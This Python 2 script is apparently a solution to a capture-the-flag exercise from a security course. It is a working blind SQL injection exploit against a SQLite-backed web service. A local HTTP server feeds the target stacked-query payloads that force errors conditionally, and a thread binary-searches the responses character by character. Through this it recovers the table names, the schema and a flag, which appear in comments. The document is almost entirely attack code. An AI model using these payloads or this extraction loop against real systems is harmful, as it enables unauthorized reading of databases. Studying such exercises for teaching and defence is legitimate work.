from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer
import urlparse
import requests
import thread

bound_mid = 0 
i = 1

def Threadfun(string, sleeptime, *args):
	global i, bound_mid
	bound_up = 128
	bound_down = 0
	result = ''
	while 1:
		for j in range(0,8):
			bound_mid = (bound_up + bound_down) / 2 
			r = requests.get('http://tor.atdog.tw:8888/index.php?ip=140.113.208.226:5200')
			#print r.content
           		if ('Insert OK' in str(r.content)):
                		bound_down = bound_mid
            		else:
                		bound_up = bound_mid
        	result = result + chr(bound_up)
		print result
		if bound_up == 0:
			break
		i += 1
		bound_up = 128 
		bound_down = 0 
	print "over"
	
class GetHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
	'''TABLE: oyoyoyoy_____1111flag '''
	message = "ShellShockTester_atdog'); SELECT CASE WHEN SUBSTR((SELECT name FROM sqlite_master LIMIT 1 OFFSET 0),%s,1) > '%s' THEN 1 ELSE abs(-9223372036854775808) END;--" %(str(i), chr(bound_mid))
	''' TABLE  yoyoyoy_____1111flag 'id integer, flag varchar'255)) '''
	message = "ShellShockTester_atdog'); SELECT CASE WHEN SUBSTR((SELECT SQL FROM sqlite_master WHERE name='oyoyoyoy_____1111flag' LIMIT 1 OFFSET 0),%s,1) > '%s' THEN 1 ELSE abs(-9223372036854775808) END;--" %(str(i), chr(bound_mid))
	''' SecProg{SQL1teInject1on_yoooo} '''
	message = "ShellShockTester_atdog'); SELECT CASE WHEN SUBSTR((SELECT flag FROM oyoyoyoy_____1111flag),%s,1) > '%s' THEN 1 ELSE abs(-9223372036854775808) END;--" %(str(i), chr(bound_mid))
        self.send_response(200) 
        self.end_headers()
        self.wfile.write(message)
        return

if __name__ == '__main__':
	server = HTTPServer(('localhost', 8080), GetHandler)
	thread.start_new_thread(Threadfun, ("ThreadFun", 1))
	print 'Starting server, use <Ctrl-C> to stop'
	server.serve_forever()
